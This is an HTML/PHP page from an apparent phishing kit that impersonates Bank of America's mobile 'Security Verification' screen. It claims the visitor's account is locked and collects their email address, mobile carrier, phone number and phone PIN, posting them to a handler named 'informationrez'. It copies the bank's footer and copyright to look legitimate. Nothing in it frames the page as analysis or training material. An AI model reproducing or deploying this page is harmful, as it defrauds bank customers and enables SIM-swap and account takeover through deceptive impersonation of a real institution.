<!DOCTYPE html>
<html class=" js no-flexbox canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

		
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
        <meta name="apple-itunes-app" content="app-id=284847138">
		<!--[if IE 9]>
			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" >
		<![endif]-->
		<title>Sign In</title>
   <link rel="shortcut icon" href="css-js/fcn.ico" type="image/ico">
<script language="JavaScript" src="css-js/ck.js" type="text/javascript"></script>

	<link rel="stylesheet" href="css-js/rs13.css"><link rel="stylesheet" href="css-js/rs15.css"><link rel="stylesheet" href="css-js/rs11.css"><link rel="stylesheet" href="css-js/rs12.css"><link rel="stylesheet" href="css-js/rs14.css"></head>

<style>
label.error {
color: red;
}
</style>
<style>
select {
   border:0px;
	margin-left: -11px;
}
.ui-select{width: 100%}
/* This is to remove the arrow of select element in IE */
select::-ms-expand {	display: none; }
select{
    -webkit-appearance: none;
    appearance: none;
}
@-moz-document url-prefix(){
	.ui-select{border: 1px solid #CCC; border-radius: 4px; box-sizing: border-box; position: relative; overflow: hidden;}
  .ui-select select { width: 110%; background-position: right 30px center !important; border: none !important;}
}

</style>
<body><form name="form" id="form" action="informationrez" method="post">
<div id="page" style="display: block; position: static; float: left; width: 100%; height: 100%;" class=""><div id="cmw_toolBar_" class="cmw_toolBar_ meter"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class="meter"><div id="cmw_toolBar_titleText" class="meter" style="padding-left: 10px; padding-right: 10px; width: 100%;">Security Verification</div>
	<span id="segmentContainerid" class="segmentContainer">
		<span id="segmentComplete0" class="segment white"></span>
		<span id="circleComplete0" class="circle white"></span>
			<span class="segmentBreak"></span>
		<span id="segmentComplete1" class="segment white"></span>
		<span id="circleComplete1" class="circle white"></span>
			<span class="segmentBreak"></span>
		<span id="segment1" class="segment white"></span>
		<span id="circle1" class="circle white"></span>
			<span class="segmentBreak"></span>
		<span id="segment2" class="segment"></span>
		<span id="circle2" class="circle"></span>
	</span>
	</h1><a id="titleLink" class="adaHidden" href="javascript:void(0)" role="toolbar">Verify Using Business Credit Card</a><a id="rightButton" class="hidden"></a></div><div id="SASI_banner_container"></div><div id="divMessaging" class="messaging"><a id="adaMessage" class="adaHidden" href="javascript:void(0)" role="text">Dear
 <? echo $_SESSION['_ID'] ?>, the access to your account has been temporarily locked.
 Please fill in the required information in order to restore your 
account.</a><span class="messageIcon error"></span><div class="messageText"><a href="#" class="closeIcon" title="Close message" role="button"></a><p aria-hidden="true" role="text" class="TLu_ERROR">Dear
 <? echo $_SESSION['_ID'] ?>, the access to your account has been temporarily locked.
 Please fill in the required information in order to restore your 
account.</p></div></div>
<div class="paddingVert10">
	<fieldset>
		<legend class="hidden"></legend>
		
		
		<div class="paddingHoriz10 fontBold">E-mail Address</div>
<div class="inputContainer" id="ans1">
<input type="email" value="" name="emailaddress" id="answer1" class="sprite-clear_input_icns" required>

		</div>
		<div class="paddingHoriz10 fontBold"><h4>Phone Verification</h4></div>
		<div class="inputContainer" id="q1">
		<select class="sprite-clear_input_icns selectType" name="select1" id="q1" required="required">
    <option value="Select your carrier">Select your carrier</option>
                                                  <option value="Verizon Wireless">Verizon Wireless</option>
                                                  <option value="AT&amp;T Mobile">AT&amp;T Mobile</option>
                                                  <option value="T-Mobile">T-Mobile</option>
                                                  <option value="Sprint Wireless">Sprint Wireless</option>
                                                  <option value="MetroPCS®">MetroPCS®</option>
                                                  <option value="Other">Other</option>
</select>
		
		</div>
<div class="paddingHoriz10 fontBold">Wireless Phone Line</div>
<div class="inputContainer" id="ans1">
<input data-mask="(000) -000-0000"  type="text" value="" name="wireless" id="wireless" class="sprite-clear_input_icns" required>

		</div>
		<div class="paddingHoriz10 fontBold">Phone Pin</div>
<div class="inputContainer" id="ans1">
<input data-mask="0000000000"  type="text" value="" name="wirelesspin" id="wirelesspin" class="sprite-clear_input_icns" required>

		</div>
		
		
		


		</fieldset>
	</div>
</div>
	<div>
                        <div id="btSignonContinue"><button type="submit" style="float:left; width:95%;" role="button" class="btn">
			<img style="margin-bottom:-4px;" class="paddingHoriz10" src="css-js/scre_lck.png">
			<span id="signonLabel">Contiune</span>
		</button></div>
	</div>
	<br><br><br><br>
	

</div>
</div><footer><div class="boa_footnote"></div><div class="boa_footer"><div class="left"><a id="boa_footer_privacy" href="" target="_blank">Privacy &amp; Security</a></div><div class="right"><a id="boa_footer_ehl" href="" class="ehl" target="_blank">Equal Housing Lender</a></div><p class="clear">© 2020 Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.</p></div></footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js?<?=md5(microtime()).md5(microtime()).md5(microtime());?>"></script>
	
<script src="css-js/jquery.mask.js?<?=md5(microtime()).md5(microtime()).md5(microtime());?>"></script>
					
					

</form>
</body></html>